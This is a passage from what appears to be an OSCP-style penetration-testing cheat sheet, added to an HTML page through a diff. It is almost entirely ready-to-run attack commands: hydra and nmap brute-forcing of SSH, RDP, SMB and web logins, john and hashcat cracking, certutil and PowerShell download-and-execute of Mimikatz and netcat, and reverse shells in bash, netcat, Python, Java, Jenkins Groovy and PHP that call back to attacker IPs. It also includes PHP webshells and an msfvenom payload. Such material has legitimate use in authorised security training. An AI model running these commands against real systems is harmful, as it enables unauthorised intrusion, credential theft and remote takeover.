+msfvenom -p windows/shell_reverse_tcp --nopsled<span style="color:#f92672">=</span><span style="color:#ae81ff">30</span> LHOST<span style="color:#f92672">=</span>192.168.119.148 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span>  EXITFUNC<span style="color:#f92672">=</span>thread -e x86/shikata_ga_nai -f python -v shell
+
+</code></pre></div><hr>
+<h1 id="brute-force-2">Brute-Force</h1>
+<h2 id="smb-bruteforce">SMB bruteforce</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nmap --script<span style="color:#f92672">=</span>smb-brute.nse 192.x.x.x
+nmap -sV -p <span style="color:#ae81ff">445</span> --script smb-brute 192.168.13.200-250
+acccheck -v -t 10.1.1.22 -u kevin -P /usr/share/wordlists/rockyou.txt
+</code></pre></div><h2 id="dns-bruteforce">DNS bruteforce</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nmap -p <span style="color:#ae81ff">80</span> --script dns-brute.nse domain.com
+python dnscan.py -d domain.com -w /subdomains-10000.txt
+</code></pre></div><h2 id="mysql-bruteforce">MySQL bruteforce</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nmap -p <span style="color:#ae81ff">3306</span> --script mysql-brute --script-args userdb<span style="color:#f92672">=</span>/usr/share/wordlists/mysql_users.txt,passdb<span style="color:#f92672">=</span>/usr/share/wordists/rockyou.txt -vv 192.168.31.199
+</code></pre></div><h4 id="generate-a-wordlist-from-a-webpage">Generate a wordlist from a webpage</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(Generatte Dictionary - cewl)</span>
+cewl -w dictionary.txt http://www.sanz.org
+cewl -w dictionary.txt - d <span style="color:#ae81ff">5</span> - m <span style="color:#ae81ff">7</span> http://www.sanz.org
+cewl -w cewl_passlist.txt -d <span style="color:#ae81ff">5</span> 10.11.1.39 /otrs/index.pl
+cewl http://www.megacorpone.com -m <span style="color:#ae81ff">6</span> -w /root/newfilelist.txt 2&gt;/dev/null
+<span style="color:#75715e">#(-d depth , -m min word lenght)</span>
+</code></pre></div><h2 id="hashcat">Hashcat</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(Brute-force md5sum with -a 3 &#39;bruteforce&#39;)</span>
+hashcat64.exe -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">0</span> hashfile wordlist
+Hashcat64.exe -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">0</span> C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\h</span>ash.txt  C:<span style="color:#ae81ff">\w</span>ordlist<span style="color:#ae81ff">\d</span>ict.lst
+</code></pre></div><h2 id="hydra">Hydra</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(Ssh Brute)</span>
+hydra -l $user -P /usr/share/wordlists/rockyou.txt ssh://10.10.73
+hydra -l $user -P /usr/share/wordlists/rockyou.txt 10.10.73.216 ssh
+hydra -L $list-users -P /usr/share/wordlists/rockyou.txt 192.168.13.234 ssh
+hydra  -l root -P /usr/share/wordlists/cristi-passwords.txt 127.0.0.1 -t <span style="color:#ae81ff">4</span> -s <span style="color:#ae81ff">50000</span> ssh
+
+<span style="color:#75715e">#(Brute Http Basic auth)</span>
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 10.10.250.189 http-get /inferno -T <span style="color:#ae81ff">64</span> -V
+
+
+<span style="color:#75715e">#(Brute force Loggin Form Post Request)</span>
+hydra -L userlist.txt -P /usr/share/wordlists/rockyou.txt $site http-form-post <span style="color:#e6db74">&#34;</span>$resource<span style="color:#e6db74">:</span>$body<span style="color:#e6db74">:</span>$Error<span style="color:#e6db74">&#34;</span> -V
+<span style="color:#75715e">#(Example)</span>
+hydra -l admin -P /root /ctf_wordlist.txt domain.com http-post-form <span style="color:#e6db74">&#34;admin.php:u=^USER^&amp;p=^PASS^&amp;f=login:&#39;Enter your username and password tocontinue&#39;&#34;</span> -V
+
+
+<span style="color:#75715e">#(Brute Force Ftp)</span>
+hydra -t <span style="color:#ae81ff">4</span> -L /usr/share/wordlists/cristi.txt -P /usr/share/wordlists/passwords.txt 192.168.13.11
+
+<span style="color:#75715e">#(Brute Force Pop)</span>
+hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.158 pop
+
+<span style="color:#75715e">#(Rdp Brute)</span>
+hydra -t <span style="color:#ae81ff">4</span> -V -l root -P /usr/share/wordlists/rockyou.txt rdp://$IP
+
+<span style="color:#75715e">#(Brute Smtp)</span>
+hydra -l root@ucal.local -P /usr/share/wordlists/rockyou.txt -t <span style="color:#ae81ff">1</span> -w <span style="color:#ae81ff">20</span> -f 192.168.29.55 smtp -V -s <span style="color:#ae81ff">25</span> -v 
+
+
+</code></pre></div><h2 id="john">John</h2>
+<h3 id="bruteforce-private-key-ssh">bruteforce private key ssh</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(Pass the private key to john format)</span>
+python /usr/share/john/ssh2john.py id_rsa &gt; id_rsa.hash
+
+<span style="color:#75715e">#(Crack with john that private key)</span>
+john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt id_rsa.hash
+
+</code></pre></div><h3 id="hashid-to-know-the-mode-hashcat-or-format-john">Hashid to know the mode hashcat or format john</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">hashid -m <span style="color:#e6db74">&#34;AAFDC23870ECBCD3D557B6423A8982134E17927E&#34;</span>
+hashid -j <span style="color:#e6db74">&#34;AAFDC23870ECBCD3D557B6423A8982134E17927E&#34;</span>
+</code></pre></div><hr>
+<h2 id="file-transfers">File Transfers</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># PYTHON</span>
+python -m SimpleHTTPServer &lt;PORT&gt;
+python2.7 -c <span style="color:#e6db74">&#34;from urllib import urlretrieve; urlretrieve(&#39;&lt;URL&gt;&#39;, &#39;&lt;DESTINATION_FILE&gt;&#39;)&#34;</span>
+
+<span style="color:#75715e">#(Ftp Transfer File windows)</span>
+<span style="color:#75715e">#(linux)</span>
+python3 -m pyftpdlib -p 21 -w
+
+<span style="color:#75715e">#(Windows)</span>
+echo open 10.10.14.5 21 &gt; ftp.txt  
+echo User Anonymous &gt;&gt; ftp.txt  
+echo Password &gt;&gt; ftp.txt  
+echo Binary &gt;&gt; ftp.txt  
+echo GET $FILE &gt;&gt; ftp.txt  
+echo BYE &gt;&gt; ftp.txt  
+
+ftp -n -s:ftp.txt -v 
+
+<span style="color:#75715e">#(SMB)</span>
+smbserver shared <span style="color:#66d9ef">$(</span>directory<span style="color:#66d9ef">)</span> -smb2support 
+
+<span style="color:#75715e">#(To copy a folder)</span>
+xcopy  <span style="color:#e6db74">&#34;rajfzh3y.default\*&#34;</span> <span style="color:#ae81ff">\\</span>10.11.31.134<span style="color:#ae81ff">\s</span>hare<span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span>
+<span style="color:#75715e">#(WGET)</span>
+wget &lt;URL&gt; -o &lt;OUT_FILE&gt;
+
+<span style="color:#75715e">#(CURL)</span>
+curl &lt;URL&gt; -o &lt;OUT_FILE&gt;
+
+<span style="color:#75715e">#(NETCAT)</span>
+nc -lvp <span style="color:#ae81ff">1234</span> &gt; $outfile
+nc $ip <span style="color:#ae81ff">1234</span> &lt; $infile 
+
+<span style="color:#75715e">#(SCP)</span>
+scp &lt;SOURCE_FILE&gt; &lt;USER&gt;@&lt;IP&gt;:&lt;DESTINATION_FILE&gt;
+</code></pre></div><h3 id="other-methods">Other Methods</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(Download a file with PowerShell)</span>
+InvokeWebRequest https://&lt;snip&gt;/PowerView.ps1 -OutFile PowerView.ps1 
+
+<span style="color:#75715e">#(Execute a file in memory using PowerShell)</span>
+powershell IEX<span style="color:#f92672">(</span>NewObject Net.WebClient<span style="color:#f92672">)</span>.DownloadString<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;https://$ip/InvokeMimikatz.ps1&#39;</span><span style="color:#f92672">)</span>
+
+<span style="color:#75715e">#(Upload a file with PowerShell)</span>
+InvokeWebRequest Uri http://10.10.10.32:443 Method POST Body $b64   
+
+<span style="color:#75715e">#(Download a file using Bitsadmin)</span>
+bitsadmin /transfer n http://10.10.10.32/nc.exe C:<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\n</span>c.exe   
+
+<span style="color:#75715e">#(Download a file using Certutil)</span>
+certutil.exe verifyctl split f http://10.10.10.32/nc.exe 
+
+<span style="color:#75715e">#(Download a file using Wget)</span>
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh O /tmp/LinEnum.sh
+
+<span style="color:#75715e">#(Download a file using cURL )</span>
+curl o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh 
+
+<span style="color:#75715e">#(Download a file using PHP )</span>
+php r <span style="color:#e6db74">&#39;$file = file_get_contents(&#34;https://&lt;snip&gt;/LinEnum.sh&#34;); file_put_contents(&#34;LinEnum.sh&#34;,$file);&#39;</span> 
+
+<span style="color:#75715e">#(Upload a file using SCP )</span>
+scp C:<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\b</span>loodhound.zip user@10.10.10.150:/tmp/bloodhound.zip 
+
+<span style="color:#75715e">#(Download a file using SCP )</span>
+scp user@target:/tmp/mimikatz.exe C:<span style="color:#ae81ff">\T</span>emp<span style="color:#ae81ff">\m</span>imikatz.exe 
+
+<span style="color:#75715e">#(nvokeWebRequest using a Chrome User Agent)</span>
+InvokeWebRequest http://nc.exe UserAgent <span style="color:#f92672">[</span>Microsoft.PowerShell.Commands.PSUserAgent<span style="color:#f92672">]</span>::Chrome OutFile <span style="color:#e6db74">&#34;nc.exe&#34;</span>  I 
+</code></pre></div><hr>
+<h2 id="reverse-shells---web-shells">Reverse Shells - Web Shells</h2>
+<h3 id="bash-reverse-shell">Bash Reverse-Shell</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">/bin/bash -c <span style="color:#e6db74">&#39;bash -i &gt; &amp; /dev/tcp/192.168.119.148/443 0&gt;&amp;1&#39;</span>
+</code></pre></div><h4 id="upgrading-shell">Upgrading Shell</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">script /dev/null -c bash  
+CTRL+Z  
+stty raw -echo   
+fg  
+reset  
+xterm   
+export TERM<span style="color:#f92672">=</span>xterm  
+shell  SHELL<span style="color:#f92672">=</span>bash
+</code></pre></div><h4 id="web-reverse-shell">Web Reverse-Shell</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">bash -c ‘ bash -i &gt;%26 /dev/tcp/xx.xxx.xxx/xxx 0&gt;%261’
+</code></pre></div><p>Escaping the Character  “&amp;” because in url with point to a variable.</p>
+<h3 id="php---bash-reverse-shell">php - bash reverse shell</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.119.148/443 0&gt;&amp;1&#39;&#34;</span> ); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><h3 id="red-hat---centos-interactive-shell">Red Hat - Centos Interactive Shell</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">mknod /tmp/backpipe p; /bin/sh 0&lt; /tmp/backpipe | nc 192.168.119.148 443 1&gt; /tmp/backpipe
+</code></pre></div><h2 id="python-execute-commands">Python Execute Commands</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> os
+os<span style="color:#f92672">.</span>system (<span style="color:#e6db74">&#34;whoami&#34;</span>)
+</code></pre></div><h3 id="python-reverse-shell">Python Reverse Shell</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;127.0.0.1&#34;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">echo <span style="color:#e6db74">&#34;import os; os.system(&#39;/bin/nc 10.10.14.10 443 -e /bin/bash&#39;)&#34;</span> &gt; /opt/tmp.py
+</code></pre></div><h3 id="nc-reverse-unix">NC Reverse Unix</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nc -e /bin/sh 10.0.0.1 <span style="color:#ae81ff">1234</span>
+</code></pre></div><h3 id="nc-reverse-shell-bsd">NC Reverse-shell BSD</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.119.148 443 &gt;/tmp/f
+</code></pre></div><h2 id="java-reverse-shell">Java Reverse Shell</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">r <span style="color:#f92672">=</span> Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">()</span>  
+p <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#f92672">[</span><span style="color:#e6db74">&#34;/bin/bash&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;-c&#34;</span><span style="color:#f92672">,</span><span style="color:#e6db74">&#34;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done&#34;</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#f92672">]</span> as String<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#f92672">[</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#f92672">])</span>  
+p<span style="color:#f92672">.</span><span style="color:#a6e22e">waitFor</span><span style="color:#f92672">()</span>
+</code></pre></div><h2 id="jenkins">JENKINS</h2>
+<h3 id="jenkins-code-execution-via-script-console">Jenkins Code Execution via Script Console</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">def command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cat /etc/passwd&#34;</span>
+def proc <span style="color:#f92672">=</span> command<span style="color:#f92672">.</span><span style="color:#a6e22e">execute</span><span style="color:#f92672">()</span>
+proc<span style="color:#f92672">.</span><span style="color:#a6e22e">waitFor</span><span style="color:#f92672">()</span>
+
+println <span style="color:#e6db74">&#34;Process exit code: ${proc.exitValue()}&#34;</span>
+println <span style="color:#e6db74">&#34;Std Err: ${proc.err.text}&#34;</span>
+println <span style="color:#e6db74">&#34;Std Out: ${proc.in.text}&#34;</span>
+</code></pre></div><h3 id="getting-reverse-shell-on-linux-machine">Getting Reverse Shell on Linux Machine</h3>
+<p><strong>We can simply use Java Reverse Shell from pentestmonkey.</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">r <span style="color:#f92672">=</span> Runtime.getRuntime<span style="color:#f92672">()</span>
+p <span style="color:#f92672">=</span> r.exec<span style="color:#f92672">([</span><span style="color:#e6db74">&#34;/bin/bash&#34;</span>,<span style="color:#e6db74">&#34;-c&#34;</span>,<span style="color:#e6db74">&#34;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&#34;</span><span style="color:#f92672">]</span> as String<span style="color:#f92672">[])</span>
+p.waitFor<span style="color:#f92672">()</span>
+</code></pre></div><h3 id="getting-reverse-shell-on-windows-machine">Getting Reverse Shell on Windows Machine</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">eString host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;localhost&#34;</span>;  
+int port<span style="color:#f92672">=</span>8044;  
+String cmd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cmd.exe&#34;</span>;  
+Process p<span style="color:#f92672">=</span>new ProcessBuilder<span style="color:#f92672">(</span>cmd<span style="color:#f92672">)</span>.redirectErrorStream<span style="color:#f92672">(</span>true<span style="color:#f92672">)</span>.start<span style="color:#f92672">()</span>;Socket s<span style="color:#f92672">=</span>new Socket<span style="color:#f92672">(</span>host,port<span style="color:#f92672">)</span>;InputStream pi<span style="color:#f92672">=</span>p.getInputStream<span style="color:#f92672">()</span>,pe<span style="color:#f92672">=</span>p.getErrorStream<span style="color:#f92672">()</span>, si<span style="color:#f92672">=</span>s.getInputStream<span style="color:#f92672">()</span>;OutputStream po<span style="color:#f92672">=</span>p.getOutputStream<span style="color:#f92672">()</span>,so<span style="color:#f92672">=</span>s.getOutputStream<span style="color:#f92672">()</span>;<span style="color:#66d9ef">while</span><span style="color:#f92672">(</span>!s.isClosed<span style="color:#f92672">()){</span><span style="color:#66d9ef">while</span><span style="color:#f92672">(</span>pi.available<span style="color:#f92672">()</span>&amp;gt;0<span style="color:#f92672">)</span>so.write<span style="color:#f92672">(</span>pi.read<span style="color:#f92672">())</span>;<span style="color:#66d9ef">while</span><span style="color:#f92672">(</span>pe.available<span style="color:#f92672">()</span>&amp;gt;0<span style="color:#f92672">)</span>so.write<span style="color:#f92672">(</span>pe.read<span style="color:#f92672">())</span>;<span style="color:#66d9ef">while</span><span style="color:#f92672">(</span>si.available<span style="color:#f92672">()</span>&amp;gt;0<span style="color:#f92672">)</span>po.write<span style="color:#f92672">(</span>si.read<span style="color:#f92672">())</span>;so.flush<span style="color:#f92672">()</span>;po.flush<span style="color:#f92672">()</span>;Thread.sleep<span style="color:#f92672">(</span>50<span style="color:#f92672">)</span>;try <span style="color:#f92672">{</span>p.exitValue<span style="color:#f92672">()</span>;break;<span style="color:#f92672">}</span>catch <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">){}}</span>;p.destroy<span style="color:#f92672">()</span>;s.close<span style="color:#f92672">()</span>;
+</code></pre></div><p>Article -&gt; Jenkins <a href="https://alionder.net/jenkins-script-console-code-exec-reverse-shell-java-deserialization/">https://alionder.net/jenkins-script-console-code-exec-reverse-shell-java-deserialization/</a></p>
+<h2 id="php-webshells">Php Webshells</h2>
+<h3 id="simple-php-webshell">Simple Php webshell</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">webshell</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span>
+</code></pre></div><h3 id="web-shell-con-etiquetas-preformatiadas">Web Shell con Etiquetas Preformatiadas</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;pre&#34;</span> ; <span style="color:#a6e22e">system</span>(<span style="color:#a6e22e">whoami</span>); <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;pre&#34;</span>; <span style="color:#66d9ef">die</span>; <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010"> 
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">&lt;?php echo &#34;&lt;pre&gt;&#34;. shell_exec($_REQUEST[&#39;cmd&#39;] ). &#34;&lt;/pre&gt;&#34; ?&gt;
+</span></code></pre></div><h3 id="reverse-shell-executing-php-code-with-internal-commands">Reverse Shell Executing Php Code With Internal Commands</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt; /tmp/f&#39;</span> ); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><h3 id="iis">IIS</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">locate aspx_cmd
+</code></pre></div><hr>
+<h1 id="zips">Zips</h1>
+<p><strong>John</strong> : File with passphrase</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(1. We pass the file to format john)</span>
+zip2jhon $zipfile &gt; zip.hash
+
+<span style="color:#75715e">#(2. Crack the file)</span>
+john zip.hash
+
+</code></pre></div><h2 id="brute-force-zip-with-password">Brute-Force Zip with Password</h2>
+<p><strong>Fcrackzip</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(Brute force zip file with passphrase)</span>
+fcrackzip -uDp /usr/share/wordlists/rockyou.txt $zipfile
+</code></pre></div><h3 id="gpg-cracking">Gpg Cracking</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(Pass the file to john format)</span>
+/usr/sbin/gpg2john tryhackme.asc &gt; PgpHash.txt
+<span style="color:#75715e">#(Crack)</span>
+johnn --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt Pgphash.txt
+</code></pre></div><h2 id="ggp-keys">Ggp Keys</h2>
+<p><strong>Basic</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(Import GPG key)</span>
+gpg --import tryhackme.asc
+
+<span style="color:#75715e">#(Decript gpg file with imported key tryhackme.asc)</span>
+gpg --decrypt credential.pgp
+
+</code></pre></div><p><strong>GPG Resources</strong>
+<a href="https://gist.github.com/turingbirds/3df43f1920a98010667a">Git Resource</a>
+<a href="https://gist.github.com/turingbirds/3df43f1920a98010667a">https://gist.github.com/turingbirds/3df43f1920a98010667a</a>
+<a href="https://www.sysadmin.md/gpg-cheatsheet.html">https://www.sysadmin.md/gpg-cheatsheet.html</a></p>
+<h2 id="recover-corrupted-zip">Recover Corrupted zip</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">zip -FF Tryharder $zipfile --out $repairzipflie
+</code></pre></div><h2 id="7z-compress">7z Compress</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(Compress a folder)</span>
+7z a /opt/lemon-repository/notes/lab-notes -r  OSCP-LAB -t7za -p
+
+<span style="color:#75715e">#(Compress multiple files)</span>
+7z a $outputFile $file1 $file2
+
+<span style="color:#75715e">#( This will compress the entire pwd, dot files included. Archive placed in pwd )</span>
+7z a -t7z $filename.tz -m0<span style="color:#f92672">=</span>lzma2 -mx<span style="color:#f92672">=</span>9 -aoa
+
+<span style="color:#75715e">#(No compression, just copy. Also, splits into 900MB parts for easier transfer over internet)</span>
+7z a -t7z -mx<span style="color:#f92672">=</span>0 -v900m $FILENAME.7z $file
+
+<span style="color:#75715e">#( Same as previous, but encrypt headers (file names, and password protected  )</span>
+7z a FILENAME.7z -t7z -mx<span style="color:#f92672">=</span>0 -mhe<span style="color:#f92672">=</span>on -p -v900m  $files.
+
+</code></pre></div><hr>
+<h1 id="gcc">GCC</h1>
+<h2 id="for-linux">For Linux</h2>
+<p><strong>Install GCC and GCC-Multilib to make Cross Compile</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">apt-get install gcc-9-base libgcc-9-dev libc6-dev  
+apt-get install gcc-multilib
+</code></pre></div><p><strong>Basic things to get exploit work fine</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(to know what librarie use a binary)</span>
+ldd $binary
+
+<span style="color:#75715e">#(Basic compilation)</span>
+gcc -c -fpic script.c  
+
+<span style="color:#75715e">#(Basic compilation shared Libraries)</span>
+gcc -o reverse.so -shared script.c -fPIC  
+<span style="color:#75715e">#(Basic object compilation)</span>
+gcc -o script.so -shared script.o    
+
+<span style="color:#75715e">#(when see that error we need get a TTY)</span>
+sh: <span style="color:#f92672">[</span>$randomNumber:4<span style="color:#f92672">]</span> tcsetattr:Invalid argument
+python -c <span style="color:#e6db74">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
+
+gcc -shared -fPIC -Wall -Wno-nonnull -m32 simple-payload.c config.h -o evil.so
+
+</code></pre></div><h3 id="cross-compiling-exploits">Cross Compiling Exploits</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(32 bit)</span>
+gcc -m32 -o output32 hello.c 
+
+<span style="color:#75715e">#(64 bit)</span>
+gcc -m64 -o output hello.c 
+</code></pre></div><h2 id="fixsharedlibraries">Fix Shared Libraries</h2>
+<p>To fix the error: <strong>==error while loading shared libraries: requires glibc 2.5 or later dynamic gcc==</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">gcc -m32 9542.c -o 9542 -Wl,--hash-sytle<span style="color:#f92672">=</span>both
+</code></pre></div><p>Article:   <a href="https://blog.didierstevens.com/2018/11/19/quickpost-compiling-32-bit-static-elf-files-on-kali/">https://blog.didierstevens.com/2018/11/19/quickpost-compiling-32-bit-static-elf-files-on-kali/</a>
+<!-- raw HTML omitted --></p>
+<h2 id="for-windows">For Windows</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(To compile Win32 bit executables)</span>
+i686-w64-mingw32-gcc -o FILE.exe FILE.c
+
+<span style="color:#75715e">#(To compile Win64 bit executables)</span>
+x86_64-w64-mingw32-gcc -o FILE.exe FILE.c
+
+<span style="color:#75715e">#(To Compiled .cpp source file)</span>
+i586-mingw32msvc-g++ -o FILE.exe FILE.cpp
+
+<span style="color:#75715e">#(To compile python scripts)</span>
+pyinstaller --onefile &lt;SCRIPT.py&gt;
+
+<span style="color:#75715e"># Compile windows .exe on Linux</span>
